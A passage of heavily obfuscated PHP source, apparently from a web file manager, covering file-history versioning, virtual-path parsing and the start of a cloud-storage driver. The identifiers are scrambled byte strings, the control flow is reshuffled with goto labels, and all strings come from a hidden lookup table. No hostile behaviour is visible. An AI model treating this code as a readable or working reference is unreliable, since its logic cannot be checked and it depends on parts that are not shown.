DØ¶Œ“àø: if ($A÷ò“ô‰êã <= 0) { return; } $aÀæÍ‰œå‘ = IO::hashSimple($Dôö£ö‘¦ö); $D’î²ƒˆ = IO::info($Dôö£ö‘¦ö); goto c„ÙÂğŠ‹ğ; A‡ßÔŸÃ”œ: if (!$C¤ñ‰­“Ä«) { self::clearEmptyFolder($F“È«´Ú‘Ğ[$BêËêÍæì’[1111]]); return !1; } array_unshift($e–¾õ‹÷«, $DŠËìç); if (count($e–¾õ‹÷«) > $cîÎÆ¨Ù´´) { $A¥–Ü‰Ç‡ = array_slice($e–¾õ‹÷«, $cîÎÆ¨Ù´´); foreach ($A¥–Ü‰Ç‡ as $eã¿½Ä£‡) { IO::remove($F“È«´Ú‘Ğ[$BêËêÍæì’[1111]] . $eã¿½Ä£‡[$BêËêÍæì’[28]]); } $e–¾õ‹÷« = array_slice($e–¾õ‹÷«, 0, $cîÎÆ¨Ù´´); } goto bÏ‹Íà³·; a¦ÂÀÁçîĞ: } public static function remove($b·É»êî², $e¢‰ÒÓæõ‰) { $CÏ„¤ğ´½Â =& $_SERVER[ÉóçÄÇ]; $F»ÕË¸Ò• = self::listData($b·É»êî²); $Aáƒ‰¹Š´† = array(); if (!$F»ÕË¸Ò•) { return !1; } foreach ($F»ÕË¸Ò•[$CÏ„¤ğ´½Â[365]] as $d‘ô‚Æ„Ğ¬) { if ($d‘ô‚Æ„Ğ¬[$CÏ„¤ğ´½Â[388]] == $e¢‰ÒÓæõ‰) { IO::remove($F»ÕË¸Ò•[$CÏ„¤ğ´½Â[1111]] . $d‘ô‚Æ„Ğ¬[$CÏ„¤ğ´½Â[28]]); continue; } $Aáƒ‰¹Š´†[] = $d‘ô‚Æ„Ğ¬; } return self::saveData($F»ÕË¸Ò•[$CÏ„¤ğ´½Â[1112]], $Aáƒ‰¹Š´†); } public static function clear($EÖ…ªñé·®, $A²ÈÃ–ÊÂœ = true) { $e‘øğ’ÅÜ” =& $_SERVER[ÉóçÄÇ]; $C”¸Ï²ÀÅŸ = self::listData($EÖ…ªñé·®, $A²ÈÃ–ÊÂœ); if (!$C”¸Ï²ÀÅŸ) { return !1; } foreach ($C”¸Ï²ÀÅŸ[$e‘øğ’ÅÜ”[365]] as $A…ªøÓËØÖ) { IO::remove($C”¸Ï²ÀÅŸ[$e‘øğ’ÅÜ”[1111]] . $A…ªøÓËØÖ[$e‘øğ’ÅÜ”[28]]); } return self::saveData($C”¸Ï²ÀÅŸ[$e‘øğ’ÅÜ”[1112]], array()); } public static function moveHistory($A¢ÂÇ®½¶, $A­†—ŒÄº = '', $AÙ¶ğªö’‰ = '') { goto e¾ßœÃÛõÙ; eŒŒ¢¡ƒ¦Š: $D²­Ÿ­õá = $F¤İ”‘ «î[1099]; $A­†—ŒÄº = $A­†—ŒÄº ? $A­†—ŒÄº : get_path_this($A¢ÂÇ®½¶); $AÙ¶ğªö’‰ = $AÙ¶ğªö’‰ ? $AÙ¶ğªö’‰ : $CŸ§…µßš®[$F¤İ”‘ «î[1111]]; goto DŠôªšÊŸö; c¨’§ø÷š†: self::saveData($CŸ§…µßš®[$F¤İ”‘ «î[1112]], $CŸ§…µßš®[$F¤İ”‘ «î[365]]); self::clearEmptyFolder($CŸ§…µßš®[$F¤İ”‘ «î[1111]]); goto dÎ‹Ö£…ìÃ; e¾ßœÃÛõÙ: $F¤İ”‘ «î =& $_SERVER[ÉóçÄÇ]; $CŸ§…µßš® = self::listData($A¢ÂÇ®½¶, !1); if (!$CŸ§…µßš® || !$CŸ§…µßš®[$F¤İ”‘ «î[365]]) { return !1; } goto eŒŒ¢¡ƒ¦Š; DŠôªšÊŸö: $a’¾…¹Î³¶ = substr(get_path_this($CŸ§…µßš®[$F¤İ”‘ «î[1112]]), 0, -strlen($D²­Ÿ­õá)); foreach ($CŸ§…µßš®[$F¤İ”‘ «î[365]] as $AØäÑ²§‘ => $dìÒŠÒï˜Ğ) { $b ·ƒ¼»Ÿ = $A­†—ŒÄº . substr($dìÒŠÒï˜Ğ[$F¤İ”‘ «î[28]], strlen($a’¾…¹Î³¶)); $FÜœå£‚é¶ = IO::move($CŸ§…µßš®[$F¤İ”‘ «î[1111]] . $dìÒŠÒï˜Ğ[$F¤İ”‘ «î[28]], $AÙ¶ğªö’‰, !1, $b ·ƒ¼»Ÿ); if ($FÜœå£‚é¶) { $CŸ§…µßš®[$F¤İ”‘ «î[365]][$AØäÑ²§‘][$F¤İ”‘ «î[28]] = $b ·ƒ¼»Ÿ; } } $CŸ§…µßš®[$F¤İ”‘ «î[1112]] = IO::move($CŸ§…µßš®[$F¤İ”‘ «î[1112]], $AÙ¶ğªö’‰, !1, $A­†—ŒÄº . $D²­Ÿ­õá); goto c¨’§ø÷š†; dÎ‹Ö£…ìÃ: } public static function rollback($FÀˆöö‰•ª, $DÅñ³Ö…Î‹) { $c‹š±ïË™Á =& $_SERVER[ÉóçÄÇ]; $F‘Ë¿Î–©Ì = self::listData($FÀˆöö‰•ª); if (!$F‘Ë¿Î–©Ì) { return; } $F‹¸ÒÜİ§ = IO::info($FÀˆöö‰•ª); foreach ($F‘Ë¿Î–©Ì[$c‹š±ïË™Á[365]] as $Bóº•¯é«ª => $cÂ¯ÀÀªˆ) { if ($cÂ¯ÀÀªˆ[$c‹š±ïË™Á[388]] == $DÅñ³Ö…Î‹) { self::add($FÀˆöö‰•ª); $FÑÇÅ‚œß– = $F‘Ë¿Î–©Ì[$c‹š±ïË™Á[1111]] . $cÂ¯ÀÀªˆ[$c‹š±ïË™Á[28]]; $fã©¤ô‘Ô = IO::copy($FÑÇÅ‚œß–, IO::pathFather($FÀˆöö‰•ª), REPEAT_REPLACE, $F‹¸ÒÜİ§[$c‹š±ïË™Á[28]]); if ($fã©¤ô‘Ô) { self::remove($FÀˆöö‰•ª, $DÅñ³Ö…Î‹); } return $fã©¤ô‘Ô; } } return !1; } public static function setDetail($ešó ®ÈÄÁ, $B¿ßšÖå÷ì, $CñõÍùÆÊ) { $e»˜¿·–â” =& $_SERVER[ÉóçÄÇ]; $cÜì®Ú¤õ = self::listData($ešó ®ÈÄÁ); if (!$cÜì®Ú¤õ) { return; } foreach ($cÜì®Ú¤õ[$e»˜¿·–â”[365]] as $Déñòâî => $fÜ¶´ÚàÄÂ) { if ($fÜ¶´ÚàÄÂ[$e»˜¿·–â”[388]] == $B¿ßšÖå÷ì) { $cÜì®Ú¤õ[$e»˜¿·–â”[365]][$Déñòâî][$e»˜¿·–â”[1110]] = $CñõÍùÆÊ; self::saveData($cÜì®Ú¤õ[$e»˜¿·–â”[1112]], $cÜì®Ú¤õ[$e»˜¿·–â”[365]]); return !0; } } return !1; } public static function fileInfo($eá ¶œÉ»Ä, $b¿ÔÆÑÛó¥) { goto AŠòÄëªÍ÷; càËÏ†Ù: return IO::info($DÇ„¬Ì©ê‘); goto aåí’Ğ±¤ø; AŠòÄëªÍ÷: $F¦Œ‹ùÙ† =& $_SERVER[ÉóçÄÇ]; $B©Æ…éˆÖè = self::listData($eá ¶œÉ»Ä); if (!$B©Æ…éˆÖè) { show_json(LNG($F¦Œ‹ùÙ†[104]), !1); } goto Aæˆ—±Öã; Aæˆ—±Öã: $DÇ„¬Ì©ê‘ = $F¦Œ‹ùÙ†[33]; foreach ($B©Æ…éˆÖè[$F¦Œ‹ùÙ†[365]] as $c¢“³âÎ‘Á => $b„—Úç‘ğ†) { if ($b„—Úç‘ğ†[$F¦Œ‹ùÙ†[388]] != $b¿ÔÆÑÛó¥) { continue; } $DÇ„¬Ì©ê‘ = $B©Æ…éˆÖè[$F¦Œ‹ùÙ†[1111]] . $b„—Úç‘ğ†[$F¦Œ‹ùÙ†[28]]; break; } if (!$DÇ„¬Ì©ê‘) { show_json(LNG($F¦Œ‹ùÙ†[104]), !1); } goto càËÏ†Ù; aåí’Ğ±¤ø: } public static function fileOut($d·Èõ‹“«, $b¶ÌÁÙ‹Ïò, $C–‘ÉÆ™¡‰ = false) { $F·ããä§Ï =& $_SERVER[ÉóçÄÇ]; $d–ùŞºõ‘à = self::fileInfo($d·Èõ‹“«, $b¶ÌÁÙ‹Ïò); $a†¤ó‡ì§ =& $GLOBALS[$F·ããä§Ï[7]]; $C–‘ÉÆ™¡‰ = isset($a†¤ó‡ì§[$F·ããä§Ï[1076]]) && $a†¤ó‡ì§[$F·ããä§Ï[1076]] == 1; if (isset($a†¤ó‡ì§[$F·ããä§Ï[29]]) && $a†¤ó‡ì§[$F·ããä§Ï[29]] == $F·ããä§Ï[1113]) { return IO::fileOutImage($d–ùŞºõ‘à[$F·ããä§Ï[75]], $a†¤ó‡ì§[$F·ããä§Ï[1114]]); } IO::fileOut($d–ùŞºõ‘à[$F·ããä§Ï[75]], $C–‘ÉÆ™¡‰, get_path_this($d·Èõ‹“«)); } public static function listData($EÜÂ× â©Ò, $BÁãß´İµŠ = true) { goto f§­‘ŸÌ½Ê; f§­‘ŸÌ½Ê: $C™ó„†© =& $_SERVER[ÉóçÄÇ]; if ($BÁãß´İµŠ && !IO::exist($EÜÂ× â©Ò)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Fä•í‘Šªí; Fä•í‘Šªí: if (substr($EÜÂ× â©Ò, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $cø²åø¸º = self::pathHistory($EÜÂ× â©Ò); $a†§Âğ¬î‡ = array($C™ó„†©[1112] => $cø²åø¸º . $C™ó„†©[1099], $C™ó„†©[1111] => rtrim(get_path_father($cø²åø¸º), $C™ó„†©[8]) . $C™ó„†©[8], $C™ó„†©[365] => array()); goto fÌÌÚğ‰è†; fÌÌÚğ‰è†: $DÏ¢†™’õÄ = IO::getContent($a†§Âğ¬î‡[$C™ó„†©[1112]]); if ($DÏ¢†™’õÄ) { $F¤ÇòÀæÕ” = json_decode($DÏ¢†™’õÄ, !0); if (is_array($F¤ÇòÀæÕ”)) { $a†§Âğ¬î‡[$C™ó„†©[365]] = $F¤ÇòÀæÕ”; } } return $a†§Âğ¬î‡; goto A³ÌÎ‡Ş¥ˆ; A³ÌÎ‡Ş¥ˆ: } private static function saveData($C¸æãíêá, $D•àîŠè¤Ì) { goto Aå±õ¿ÌùÒ; Aå±õ¿ÌùÒ: $D°İÂÎƒÆ =& $_SERVER[ÉóçÄÇ]; self::log($D°İÂÎƒÆ[1115] . $C¸æãíêá . $D°İÂÎƒÆ[67] . count($D•àîŠè¤Ì), $D°İÂÎƒÆ[713]); if ($D•àîŠè¤Ì) { return IO::setContent($C¸æãíêá, json_encode($D•àîŠè¤Ì)); } goto A‡—İâ–; B‰öÏÔÏ®½: return !0; goto Bºí³ğ²”Ç; A‡—İâ–: $Eì¯½Ïêìİ = IO::pathFather($C¸æãíêá); IO::remove($C¸æãíêá); self::clearEmptyFolder($Eì¯½Ïêìİ); goto B‰öÏÔÏ®½; Bºí³ğ²”Ç: } public static function clearEmptyFolder($Bë­ÒÊ¢ß–) { goto däÆŠ¡‡Õİ; däÆŠ¡‡Õİ: $cß”¶¤‹· =& $_SERVER[ÉóçÄÇ]; if (trim($Bë­ÒÊ¢ß–, $cß”¶¤‹·[8]) == trim(self::$_historyBase, $cß”¶¤‹·[8])) { return; } $AèÀêÇöøÈ = IO::pathFather($Bë­ÒÊ¢ß–); goto c£Ìó…ïòÍ; CŠÍ‡†ÔÎ—: self::clearEmptyFolder($AèÀêÇöøÈ); goto CŒ¡ ÉçµË; c£Ìó…ïòÍ: $cã‘—‹Ê = IO::has($Bë­ÒÊ¢ß–, !0); if ($cã‘—‹Ê[$cß”¶¤‹·[201]] > 0 || $cã‘—‹Ê[$cß”¶¤‹·[202]] > 0) { return; } IO::remove($Bë­ÒÊ¢ß–); goto CŠÍ‡†ÔÎ—; CŒ¡ ÉçµË: } private static function getBasePath() { goto eÊÃæéµ¦Í; eÊÃæéµ¦Í: $BÔöŒ×‰Î =& $_SERVER[ÉóçÄÇ]; $b„´÷•½ê = Model($BÔöŒ×‰Î[1116])->get($BÔöŒ×‰Î[1117]); if (IO::exist($b„´÷•½ê)) { return $b„´÷•½ê; } goto Fç²ÉÑÓ´; E»Íä…°×Š: file_put_contents($b„´÷•½ê . $BÔöŒ×‰Î[1119], $BÔöŒ×‰Î[33]); Model($BÔöŒ×‰Î[1116])->set($BÔöŒ×‰Î[1117], $b„´÷•½ê); return $b„´÷•½ê; goto A›ïÛˆÓ•Ş; Fç²ÉÑÓ´: $b„´÷•½ê = DATA_PATH . $BÔöŒ×‰Î[1118]; $b„´÷•½ê = IO::mkdir($b„´÷•½ê); $b„´÷•½ê = rtrim($b„´÷•½ê, $BÔöŒ×‰Î[8]) . $BÔöŒ×‰Î[8]; goto E»Íä…°×Š; A›ïÛˆÓ•Ş: } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\x52\145\x63\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\x46\151\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\154\145\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\x70\122\x6f\157\164\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\150\141\x72\145\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\x65\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\111\x74\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\111\164\x65\155\114\x69\156\153\175"; const KOD_SEARCH = "\173\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\145\156\143\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\162\175"; public static function typeList() { $a¦­†á«¶ =& $_SERVER[ÉóçÄÇ]; return array($a¦­†á«¶[1120] => self::KOD_SOURCE, $a¦­†á«¶[1121] => self::KOD_USER_RECYCLE, $a¦­†á«¶[1122] => self::KOD_USER_FAV, $a¦­†á«¶[1123] => self::KOD_USER_FILE_TAG, $a¦­†á«¶[1124] => self::KOD_USER_FILE_TYPE, $a¦­†á«¶[1125] => self::KOD_GROUP_ROOT_SELF, $a¦­†á«¶[1126] => self::KOD_USER_SHARE, $a¦­†á«¶[1127] => self::KOD_USER_SHARE_LINK, $a¦­†á«¶[1128] => self::KOD_USER_SHARE_TO_ME, $a¦­†á«¶[1129] => self::KOD_SHARE_ITEM, $a¦­†á«¶[1130] => self::KOD_SHARE_LINK, $a¦­†á«¶[1131] => self::KOD_SEARCH, $a¦­†á«¶[1132] => self::KOD_BLOCK, $a¦­†á«¶[1133] => self::KOD_IO, $a¦­†á«¶[1134] => self::KOD_USER_RECENT, $a¦­†á«¶[1135] => self::KOD_USER_DRIVER); } public static function parse($Fİö’°™½ğ) { goto bÉ¿õÚ†­®; Aí¼îºÙö: preg_match($e¯ ùˆš‚ö[1136], $Fİö’°™½ğ, $d²ÔˆèÉ¯š); $dêÔøÁ—Ëµ = array($e¯ ùˆš‚ö[409] => !1, $e¯ ùˆš‚ö[1137] => !1, $e¯ ùˆš‚ö[406] => !1, $e¯ ùˆš‚ö[75] => $Fİö’°™½ğ, $e¯ ùˆš‚ö[1047] => !1, $e¯ ùˆš‚ö[1046] => $e¯ ùˆš‚ö[33]); if (is_array($d²ÔˆèÉ¯š) && count($d²ÔˆèÉ¯š) == 5) { $aÀÔÔÊùÚÌ = $e¯ ùˆš‚ö[1138] . $d²ÔˆèÉ¯š[2] . $e¯ ùˆš‚ö[323]; if (in_array($aÀÔÔÊùÚÌ, $E†®¤‡Ç‚ø)) { $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[1047]] = $d²ÔˆèÉ¯š[1]; $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[29]] = $aÀÔÔÊùÚÌ; $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[1139]] = substr($aÀÔÔÊùÚÌ, 1, -1); $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[388]] = $d²ÔˆèÉ¯š[3]; } $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[1046]] = $d²ÔˆèÉ¯š[4]; } goto fšÂİ”ƒ; bÉ¿õÚ†­®: $e¯ ùˆš‚ö =& $_SERVER[ÉóçÄÇ]; $Fİö’°™½ğ = self::clear($Fİö’°™½ğ); $E†®¤‡Ç‚ø = array_values(self::typeList()); goto Aí¼îºÙö; fšÂİ”ƒ: $Fá†óÓÄÉ£ = array($e¯ ùˆš‚ö[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[1101]] = in_array($dêÔøÁ—Ëµ[$e¯ ùˆš‚ö[29]], $Fá†óÓÄÉ£); return $dêÔøÁ—Ëµ; goto E¥Æ Å „¦; E¥Æ Å „¦: } public static function isTruePath($DÁëµ¨Ó) { goto FŠÄ¬á¡Õµ; d˜ª •‡Èâ: if (strpos($DÁëµ¨Ó, $E­‚­¦Ú³¼[1104]) === 0) { return !0; } if (strpos($DÁëµ¨Ó, $E­‚­¦Ú³¼[1140]) === 0) { return !0; } if (strpos($DÁëµ¨Ó, $E­‚­¦Ú³¼[1140]) === 0) { return !0; } goto A¿Ë·’·À®; FŠÄ¬á¡Õµ: $E­‚­¦Ú³¼ =& $_SERVER[ÉóçÄÇ]; if (substr($DÁëµ¨Ó, 0, 1) != $E­‚­¦Ú³¼[1138]) { return !0; } if (strpos($DÁëµ¨Ó, $E­‚­¦Ú³¼[395]) === 0) { return !0; } goto d˜ª •‡Èâ; A¿Ë·’·À®: if (strpos($DÁëµ¨Ó, $E­‚­¦Ú³¼[1141]) === 0) { return !0; } return !1; goto F‹—½óáÒæ; F‹—½óáÒæ: } public static function clear($EäÔ×ëÓ¶§) { goto eÌÉó×¯Í÷; C®ßÚ¬…º»: $EäÔ×ëÓ¶§ = preg_replace($Fä®÷¤ŠÕ‚[1144], $Fä®÷¤ŠÕ‚[8], $EäÔ×ëÓ¶§); if ($EäÔ×ëÓ¶§ == $Fä®÷¤ŠÕ‚[8]) { return $Fä®÷¤ŠÕ‚[8]; } $EäÔ×ëÓ¶§ = rtrim($EäÔ×ëÓ¶§, $Fä®÷¤ŠÕ‚[8]); goto báŞª”éİ“; B¨ÄºÀ“Ñ´: $EÅå•Ô×Á = $Fä®÷¤ŠÕ‚[1142]; if (substr($EäÔ×ëÓ¶§, 0, 3) == $Fä®÷¤ŠÕ‚[1143]) { $EäÔ×ëÓ¶§ = substr($EäÔ×ëÓ¶§, 3); } while (strstr($EäÔ×ëÓ¶§, $EÅå•Ô×Á)) { $EäÔ×ëÓ¶§ = str_replace($EÅå•Ô×Á, $Fä®÷¤ŠÕ‚[8], $EäÔ×ëÓ¶§); } goto C®ßÚ¬…º»; eÌÉó×¯Í÷: $Fä®÷¤ŠÕ‚ =& $_SERVER[ÉóçÄÇ]; $EäÔ×ëÓ¶§ = str_replace(array($Fä®÷¤ŠÕ‚[1020], $Fä®÷¤ŠÕ‚[227]), $Fä®÷¤ŠÕ‚[50], $EäÔ×ëÓ¶§); $EäÔ×ëÓ¶§ = str_replace($Fä®÷¤ŠÕ‚[96], $Fä®÷¤ŠÕ‚[8], $EäÔ×ëÓ¶§); goto B¨ÄºÀ“Ñ´; báŞª”éİ“: return $EäÔ×ëÓ¶§; goto dˆÅˆ†²ˆ; dˆÅˆ†²ˆ: } public static function sourceID($fÙ²õˆíô) { $eÍ‡¿¡½Ü• =& $_SERVER[ÉóçÄÇ]; $Fğ»­ÇŒÇ = self::parse($fÙ²õˆíô); if ($Fğ»­ÇŒÇ[$eÍ‡¿¡½Ü•[29]] !== self::KOD_SOURCE) { show_json(LNG($eÍ‡¿¡½Ü•[1145]), !1); } return $Fğ»­ÇŒÇ[$eÍ‡¿¡½Ü•[388]]; } public static function make($BîÀÕ«Ú²) { if (!$BîÀÕ«Ú²) { return !1; } return self::makePath(self::KOD_SOURCE, intval($BîÀÕ«Ú²)); } public static function makeShare($Dº¿³²ÕÌÄ, $fŒÂ­ìÉÖš) { return self::makePath(self::KOD_SHARE_ITEM, $Dº¿³²ÕÌÄ, $fŒÂ­ìÉÖš); } public static function makeFileTypePath($fà¡¨¿³º¢) { return self::makePath(self::KOD_USER_FILE_TYPE, $fà¡¨¿³º¢); } public static function makeFileTagPath($DáêçéŠŒ) { return self::makePath(self::KOD_USER_FILE_TAG, $DáêçéŠŒ); } public static function makePath($aé‹ë‹Êô½, $bÄ´×«Ä‚ = '', $aŸ´÷Ê›ÜÜ = '') { $AÙìœŞèË‘ =& $_SERVER[ÉóçÄÇ]; $e´ÀÚé¬Œ = substr($aé‹ë‹Êô½, 1, -1); $Aƒˆ¶”çÕé = $AÙìœŞèË‘[1146] . $e´ÀÚé¬Œ . $AÙìœŞèË‘[1147] . $bÄ´×«Ä‚ . $AÙìœŞèË‘[1148]; $Aƒˆ¶”çÕé = $aŸ´÷Ê›ÜÜ ? $Aƒˆ¶”çÕé . $aŸ´÷Ê›ÜÜ . $AÙìœŞèË‘[8] : $Aƒˆ¶”çÕé; return $Aƒˆ¶”çÕé; } public static function hashPath($FÑƒ—Ÿ«¥) { $Cßß‚˜ìºõ =& $_SERVER[ÉóçÄÇ]; $D”»¤½ŠºÎ = is_array($FÑƒ—Ÿ«¥) ? $FÑƒ—Ÿ«¥ : IO::info($FÑƒ—Ÿ«¥); $c¼ºë£„Ğ™ = _get($D”»¤½ŠºÎ, $Cßß‚˜ìºõ[1149], $Cßß‚˜ìºõ[33]); if (!$c¼ºë£„Ğ™) { $bÅÏ¶…Ù¦ = KodIO::parse($D”»¤½ŠºÎ[$Cßß‚˜ìºõ[75]]); if (!$bÅÏ¶…Ù¦[$Cßß‚˜ìºõ[29]]) { $c¼ºë£„Ğ™ = IO::hashSimple($D”»¤½ŠºÎ[$Cßß‚˜ìºõ[75]]); } } if (!$c¼ºë£„Ğ™) { $c¼ºë£„Ğ™ = md5($D”»¤½ŠºÎ[$Cßß‚˜ìºõ[75]] . $D”»¤½ŠºÎ[$Cßß‚˜ìºõ[77]] . $D”»¤½ŠºÎ[$Cßß‚˜ìºõ[83]]); } return $c¼ºë£„Ğ™; } public static function initSystemPath() { goto aœ‡¶…–”; dºà…•œ›ö: IOHistory::bindEvent(); goto f¯Üøâ‡Öï; b’ß‚‘‹Ù§: define($bÉøŒ¢îì[1152], self::systemPath($bÉøŒ¢îì[1153])); define($bÉøŒ¢îì[1154], self::systemPath($bÉøŒ¢îì[1155])); define($bÉøŒ¢îì[1156], self::systemPath($bÉøŒ¢îì[1157])); goto dºà…•œ›ö; aœ‡¶…–”: $bÉøŒ¢îì =& $_SERVER[ÉóçÄÇ]; if (defined($bÉøŒ¢îì[1150])) { return; } define($bÉøŒ¢îì[1150], self::systemPath($bÉøŒ¢îì[1151])); goto b’ß‚‘‹Ù§; f¯Üøâ‡Öï: } public static function systemPath($D·Ü »¤ÚÕ) { goto dôâ¡¥•¾¿; dƒ›Ì÷ˆ¡ƒ: return $fµ¾óà‚˜; goto dÕŒ¹åÎ÷Ä; dôâ¡¥•¾¿: $Dùæ©ÓÀë® =& $_SERVER[ÉóçÄÇ]; $E‘¬˜ää‡÷ = $Dùæ©ÓÀë®[1158] . ucfirst($D·Ü »¤ÚÕ); $fµ¾óà‚˜ = Model($Dùæ©ÓÀë®[1106])->get($E‘¬˜ää‡÷); goto EÖŒÀâ¿‘; EÖŒÀâ¿‘: if ($fµ¾óà‚˜) { return $fµ¾óà‚˜; } if ($D·Ü »¤ÚÕ == $Dùæ©ÓÀë®[1151]) { $fµ¾óà‚˜ = self::make(Model($Dùæ©ÓÀë®[776])->systemRootPathAdd($Dùæ©ÓÀë®[500])); } else { $fµ¾óà‚˜ = self::systemPath($Dùæ©ÓÀë®[1151]); $eƒ²ˆ³Àõ = self::sourceID($fµ¾óà‚˜); $fµ¾óà‚˜ = self::make(Model($Dùæ©ÓÀë®[776])->mkdir($eƒ²ˆ³Àõ, $D·Ü »¤ÚÕ)); } Model($Dùæ©ÓÀë®[1106])->set($E‘¬˜ää‡÷, $fµ¾óà‚˜); goto dƒ›Ì÷ˆ¡ƒ; dÕŒ¹åÎ÷Ä: } public static function systemFolder($FõÜŞÈ¼Š) { $FŒÔ­µê…— = IO_PATH_SYSTEM_SOURCE . $FõÜŞÈ¼Š; $FÅÃ‹ğÉÚ = Cache::get($FŒÔ­µê…—); if (!$FÅÃ‹ğÉÚ) { $C¡ÑÄÖÉò‰ = IO::infoFull($FŒÔ­µê…—); if (!$C¡ÑÄÖÉò‰) { $FÅÃ‹ğÉÚ = IO::mkdir($FŒÔ­µê…—, REPEAT_SKIP); } else { $FÅÃ‹ğÉÚ = $C¡ÑÄÖÉò‰[$_SERVER[ÉóçÄÇ][75]]; } Cache::set($FŒÔ­µê…—, $FÅÃ‹ğÉÚ, 3600 * 10); } return $FÅÃ‹ğÉÚ; } public static function defaultDriver() { return Model($_SERVER[ÉóçÄÇ][725])->defaultDriver(); } public static function defaultIO() { $cà¯‡¦®´„ =& $_SERVER[ÉóçÄÇ]; $e¨äÔŒãê = self::defaultDriver(); return $cà¯‡¦®´„[1159] . $e¨äÔŒãê[$cà¯‡¦®´„[388]] . $cà¯‡¦®´„[1148]; } public static function defaultDriverInit() { static $D½ÖÒÀÔƒ = false; if ($D½ÖÒÀÔƒ) { return $D½ÖÒÀÔƒ; } $D½ÖÒÀÔƒ = IO::init(self::defaultIO()); return $D½ÖÒÀÔƒ; } public static function fileTypeList() { $eÇ ¤™ïœ =& $_SERVER[ÉóçÄÇ]; $B¶Õ†ØÖ = $GLOBALS[$eÇ ¤™ïœ[6]][$eÇ ¤™ïœ[1160]]; foreach ($B¶Õ†ØÖ as $côÇà”ôê => $Dƒ×ĞÂÆ) { $E½Û‹Âµ = $eÇ ¤™ïœ[1161] . $côÇà”ôê; $BÛ§òËá¿¡ = LNG($E½Û‹Âµ); if ($E½Û‹Âµ != $BÛ§òËá¿¡) { $B¶Õ†ØÖ[$côÇà”ôê][$eÇ ¤™ïœ[28]] = $BÛ§òËá¿¡; } } return $B¶Õ†ØÖ; } public static function transferType($d§‡ºâŸ°, $díâ±ôÀö‘) { goto B°ƒÕÇÍÄ¨; F‚ïœëß”: return $Bà¬šÖíîó[1164]; goto d’ÚÎ¿êÒï; cÎÇŞóÁƒî: if ($Eõ¬¾…äÊÏ[$Bà¬šÖíîó[29]] == $a¢Š±õ´Œ[$Bà¬šÖíîó[29]] && $Eõ¬¾…äÊÏ[$Bà¬šÖíîó[1162]] == $a¢Š±õ´Œ[$Bà¬šÖíîó[1162]]) { return $Bà¬šÖíîó[1163]; } if ($Eõ¬¾…äÊÏ[$Bà¬šÖíîó[29]] == $Bà¬šÖíîó[809] && $a¢Š±õ´Œ[$Bà¬šÖíîó[29]] == $Bà¬šÖíîó[105]) { return $Bà¬šÖíîó[1076]; } if ($Eõ¬¾…äÊÏ[$Bà¬šÖíîó[29]] == $Bà¬šÖíîó[105] && $a¢Š±õ´Œ[$Bà¬šÖíîó[29]] == $Bà¬šÖíîó[809]) { return $Bà¬šÖíîó[106]; } goto F‚ïœëß”; B°ƒÕÇÍÄ¨: $Bà¬šÖíîó =& $_SERVER[ÉóçÄÇ]; $Eõ¬¾…äÊÏ = self::driverType($d§‡ºâŸ°); $a¢Š±õ´Œ = self::driverType($díâ±ôÀö‘); goto cÎÇŞóÁƒî; d’ÚÎ¿êÒï: } public static function driverType($dîÍïøµŞ®) { goto aëõ“Ğ×Ğ½; AùÈ×·İë : if ($bãÙ¥‘„á¾ == $e†‚İõ›í[716] || $bãÙ¥‘„á¾ == $e†‚İõ›í[1166] || $bãÙ¥‘„á¾ == $e†‚İõ›í[1167]) { $dîÍïøµŞ® = self::defaultDriverInit(); } else { if ($bãÙ¥‘„á¾ == $e†‚İõ›í[1083] || $bãÙ¥‘„á¾ == $e†‚İõ›í[1168]) { $dîÍïøµŞ® = IO::init($dîÍïøµŞ®->pathParse[$e†‚İõ›í[1030]]); } } $bãÙ¥‘„á¾ = str_replace($e†‚İõ›í[1165], $e†‚İõ›í[33], strtolower($dîÍïøµŞ®->getType())); if ($bãÙ¥‘„á¾ == $e†‚İõ›í[105]) { return array($e†‚İõ›í[29] => $e†‚İõ›í[105], $e†‚İõ›í[1162] => $e†‚İõ›í[33], $e†‚İõ›í[75] => $DÙ¥›äª‡…); } goto b‘’ªÎºŸ›; aëõ“Ğ×Ğ½: $e†‚İõ›í =& $_SERVER[ÉóçÄÇ]; $DÙ¥›äª‡… = $dîÍïøµŞ®->path; $bãÙ¥‘„á¾ = str_replace($e†‚İõ›í[1165], $e†‚İõ›í[33], strtolower($dîÍïøµŞ®->getType())); goto AùÈ×·İë ; b‘’ªÎºŸ›: return array($e†‚İõ›í[29] => $e†‚İõ›í[809], $e†‚İõ›í[1162] => $dîÍïøµŞ®->pathDriver, $e†‚İõ›í[75] => $DÙ¥›äª‡…); goto CòáÂò‘ŒÎ; CòáÂò‘ŒÎ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Eï¹¥ó–‹¥) { parent::__construct($Eï¹¥ó–‹¥); $this->signatureVersion($_SERVER[ÉóçÄÇ][210]); } public function 